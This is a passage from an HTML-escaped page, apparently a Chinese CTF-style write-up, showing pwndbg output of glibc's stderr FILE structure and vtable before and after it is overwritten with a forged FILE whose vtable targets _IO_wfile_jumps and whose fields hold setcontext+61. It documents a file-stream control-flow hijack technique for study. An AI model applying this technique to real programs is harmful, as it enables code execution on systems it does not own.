class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; p &amp;amp;_IO_list_all&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; = (&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; _IO_FILE_plus **) &lt;span class=&#34;number&#34;&gt;0x7f56882ae680&lt;/span&gt; &amp;lt;_IO_list_all&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; p *(&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; _IO_FILE_plus **) &lt;span class=&#34;number&#34;&gt;0x7f56882ae680&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; = (&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; _IO_FILE_plus *) &lt;span class=&#34;number&#34;&gt;0x7f56882ae6a0&lt;/span&gt; &amp;lt;_IO_2_1_stderr_&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; p *(&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; _IO_FILE_plus *) &lt;span class=&#34;number&#34;&gt;0x7f56882ae6a0&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt; = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  file = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _flags = &lt;span class=&#34;number&#34;&gt;-72540025&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_read_ptr = &lt;span class=&#34;number&#34;&gt;0x7f56882ae723&lt;/span&gt; &amp;lt;_IO_2_1_stderr_+&lt;span class=&#34;number&#34;&gt;131&lt;/span&gt;&amp;gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_read_end = &lt;span class=&#34;number&#34;&gt;0x7f56882ae723&lt;/span&gt; &amp;lt;_IO_2_1_stderr_+&lt;span class=&#34;number&#34;&gt;131&lt;/span&gt;&amp;gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_read_base = &lt;span class=&#34;number&#34;&gt;0x7f56882ae723&lt;/span&gt; &amp;lt;_IO_2_1_stderr_+&lt;span class=&#34;number&#34;&gt;131&lt;/span&gt;&amp;gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_write_base = &lt;span class=&#34;number&#34;&gt;0x7f56882ae723&lt;/span&gt; &amp;lt;_IO_2_1_stderr_+&lt;span class=&#34;number&#34;&gt;131&lt;/span&gt;&amp;gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_write_ptr = &lt;span class=&#34;number&#34;&gt;0x7f56882ae723&lt;/span&gt; &amp;lt;_IO_2_1_stderr_+&lt;span class=&#34;number&#34;&gt;131&lt;/span&gt;&amp;gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_write_end = &lt;span class=&#34;number&#34;&gt;0x7f56882ae723&lt;/span&gt; &amp;lt;_IO_2_1_stderr_+&lt;span class=&#34;number&#34;&gt;131&lt;/span&gt;&amp;gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_buf_base = &lt;span class=&#34;number&#34;&gt;0x7f56882ae723&lt;/span&gt; &amp;lt;_IO_2_1_stderr_+&lt;span class=&#34;number&#34;&gt;131&lt;/span&gt;&amp;gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_buf_end = &lt;span class=&#34;number&#34;&gt;0x7f56882ae724&lt;/span&gt; &amp;lt;_IO_2_1_stderr_+&lt;span class=&#34;number&#34;&gt;132&lt;/span&gt;&amp;gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_save_base = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_backup_base = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_save_end = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _markers = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _chain = &lt;span class=&#34;number&#34;&gt;0x7f56882ae780&lt;/span&gt; &amp;lt;_IO_2_1_stdout_&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _fileno = &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _flags2 = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _old_offset = &lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _cur_column = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _vtable_offset = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;\000&amp;#x27;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _shortbuf = &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _lock = &lt;span class=&#34;number&#34;&gt;0x7f56882afa60&lt;/span&gt; &amp;lt;_IO_stdfile_2_lock&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _offset = &lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _codecvt = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _wide_data = &lt;span class=&#34;number&#34;&gt;0x7f56882ad8a0&lt;/span&gt; &amp;lt;_IO_wide_data_2&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _freeres_list = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _freeres_buf = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    __pad5 = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _mode = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _unused2 = &lt;span class=&#34;string&#34;&gt;&amp;#x27;\000&amp;#x27;&lt;/span&gt; &amp;lt;repeats &lt;span class=&#34;number&#34;&gt;19&lt;/span&gt; times&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  vtable = &lt;span class=&#34;number&#34;&gt;0x7f56882aa600&lt;/span&gt; &amp;lt;_IO_file_jumps&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; p _IO_file_jumps&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt; = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __dummy = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __dummy2 = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __finish = &lt;span class=&#34;number&#34;&gt;0x7f5688120070&lt;/span&gt; &amp;lt;_IO_new_file_finish&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __overflow = &lt;span class=&#34;number&#34;&gt;0x7f5688120e40&lt;/span&gt; &amp;lt;_IO_new_file_overflow&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __underflow = &lt;span class=&#34;number&#34;&gt;0x7f5688120b30&lt;/span&gt; &amp;lt;_IO_new_file_underflow&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __uflow = &lt;span class=&#34;number&#34;&gt;0x7f5688121de0&lt;/span&gt; &amp;lt;__GI__IO_default_uflow&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __pbackfail = &lt;span class=&#34;number&#34;&gt;0x7f5688123300&lt;/span&gt; &amp;lt;__GI__IO_default_pbackfail&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __xsputn = &lt;span class=&#34;number&#34;&gt;0x7f568811f680&lt;/span&gt; &amp;lt;_IO_new_file_xsputn&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __xsgetn = &lt;span class=&#34;number&#34;&gt;0x7f568811f330&lt;/span&gt; &amp;lt;__GI__IO_file_xsgetn&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __seekoff = &lt;span class=&#34;number&#34;&gt;0x7f568811e960&lt;/span&gt; &amp;lt;_IO_new_file_seekoff&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __seekpos = &lt;span class=&#34;number&#34;&gt;0x7f5688122530&lt;/span&gt; &amp;lt;_IO_default_seekpos&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __setbuf = &lt;span class=&#34;number&#34;&gt;0x7f568811e620&lt;/span&gt; &amp;lt;_IO_new_file_setbuf&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __sync = &lt;span class=&#34;number&#34;&gt;0x7f568811e4b0&lt;/span&gt; &amp;lt;_IO_new_file_sync&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __doallocate = &lt;span class=&#34;number&#34;&gt;0x7f5688112b90&lt;/span&gt; &amp;lt;__GI__IO_file_doallocate&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __read = &lt;span class=&#34;number&#34;&gt;0x7f568811f9b0&lt;/span&gt; &amp;lt;__GI__IO_file_read&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __write = &lt;span class=&#34;number&#34;&gt;0x7f568811ef40&lt;/span&gt; &amp;lt;_IO_new_file_write&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __seek = &lt;span class=&#34;number&#34;&gt;0x7f568811e6f0&lt;/span&gt; &amp;lt;__GI__IO_file_seek&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __close = &lt;span class=&#34;number&#34;&gt;0x7f568811e610&lt;/span&gt; &amp;lt;__GI__IO_file_close&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __stat = &lt;span class=&#34;number&#34;&gt;0x7f568811ef30&lt;/span&gt; &amp;lt;__GI__IO_file_stat&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __showmanyc = &lt;span class=&#34;number&#34;&gt;0x7f56881234a0&lt;/span&gt; &amp;lt;_IO_default_showmanyc&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __imbue = &lt;span class=&#34;number&#34;&gt;0x7f56881234b0&lt;/span&gt; &amp;lt;_IO_default_imbue&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;修改后 (地址不一样，看偏移)&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; p *(&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; _IO_FILE_plus *) &lt;span class=&#34;number&#34;&gt;0x562fcda56370&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$&lt;span class=&#34;number&#34;&gt;7&lt;/span&gt; = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  file = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _flags = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_read_ptr = &lt;span class=&#34;number&#34;&gt;0x451&lt;/span&gt; &amp;lt;error: Cannot access memory at address &lt;span class=&#34;number&#34;&gt;0x451&lt;/span&gt;&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_read_end = &lt;span class=&#34;number&#34;&gt;0x7f2b2d5cc0e0&lt;/span&gt; &amp;lt;main_arena+&lt;span class=&#34;number&#34;&gt;1120&lt;/span&gt;&amp;gt; &lt;span class=&#34;string&#34;&gt;&amp;quot; t\245\315/V&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_read_base = &lt;span class=&#34;number&#34;&gt;0x562fcda55290&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_write_base = &lt;span class=&#34;number&#34;&gt;0x562fcda55290&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_write_ptr = &lt;span class=&#34;number&#34;&gt;0x7f2b2d5cc840&lt;/span&gt; &amp;lt;_IO_2_1_stdout_+&lt;span class=&#34;number&#34;&gt;192&lt;/span&gt;&amp;gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_write_end = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_buf_base = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_buf_end = &lt;span class=&#34;number&#34;&gt;0x1&lt;/span&gt; &amp;lt;error: Cannot access memory at address &lt;span class=&#34;number&#34;&gt;0x1&lt;/span&gt;&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_save_base = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_backup_base = &lt;span class=&#34;number&#34;&gt;0x562fcda57cd0&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_save_end = &lt;span class=&#34;number&#34;&gt;0x7f2b2d405a6d&lt;/span&gt; &amp;lt;setcontext+&lt;span class=&#34;number&#34;&gt;61&lt;/span&gt;&amp;gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;H\213\242\240&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _markers = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _chain = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _fileno = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _flags2 = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _old_offset = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _cur_column = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _vtable_offset = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;\000&amp;#x27;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _shortbuf = &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _lock = &lt;span class=&#34;number&#34;&gt;0x562fcda56000&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _offset = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _codecvt = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _wide_data = &lt;span class=&#34;number&#34;&gt;0x562fcda563a0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _freeres_list = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _freeres_buf = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    __pad5 = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _mode = &lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _unused2 = &lt;span class=&#34;string&#34;&gt;&amp;#x27;\000&amp;#x27;&lt;/span&gt; &amp;lt;repeats &lt;span class=&#34;number&#34;&gt;19&lt;/span&gt; times&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  vtable = &lt;span class=&#34;number&#34;&gt;0x7f2b2d5c80d0&lt;/span&gt; &amp;lt;_IO_wfile_jumps+&lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; p _IO_file_jumps&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt; = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __dummy = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __dummy2 = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __finish = &lt;span class=&#34;number&#34;&gt;0x7f2b2d43e070&lt;/span&gt; &amp;lt;_IO_new_file_finish&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __overflow = &lt;span class=&#34;number&#34;&gt;0x7f2b2d43ee40&lt;/span&gt; &amp;lt;_IO_new_file_overflow&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __underflow = &lt;span class=&#34;number&#34;&gt;0x7f2b2d43eb30&lt;/span&gt; &amp;lt;_IO_new_file_underflow&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __uflow = &lt;span class=&#34;number&#34;&gt;0x7f2b2d43fde0&lt;/span&gt; &amp;lt;__GI__IO_default_uflow&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __pbackfail = &lt;span class=&#34;number&#34;&gt;0x7f2b2d441300&lt;/span&gt; &amp;lt;__GI__IO_default_pbackfail&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __xsputn = &lt;span class=&#34;number&#34;&gt;0x7f2b2d43d680&lt;/span&gt; &amp;lt;_IO_new_file_xsputn&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __xsgetn = &lt;span class=&#34;number&#34;&gt;0x7f2b2d43d330&lt;/span&gt; &amp;lt;__GI__IO_file_xsgetn&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __seekoff = &lt;span class=&#34;number&#34;&gt;0x7f2b2d43c960&lt;/span&gt; &amp;lt;_IO_new_file_seekoff&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __seekpos = &lt;span class=&#34;number&#34;&gt;0x7f2b2d440530&lt;/span&gt; &amp;lt;_IO_default_seekpos&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __setbuf = &lt;span class=&#34;number&#34;&gt;0x7f2b2d43c620&lt;/span&gt; &amp;lt;_IO_new_file_setbuf&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __sync = &lt;span class=&#34;number&#34;&gt;0x7f2b2d43c4b0&lt;/span&gt; &amp;lt;_IO_new_file_sync&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __doallocate = &lt;span class=&#34;number&#34;&gt;0x7f2b2d430b90&lt;/span&gt; &amp;lt;__GI__IO_file_doallocate&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __read = &lt;span class=&#34;number&#34;&gt;0x7f2b2d43d9b0&lt;/span&gt; &amp;lt;__GI__IO_file_read&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span 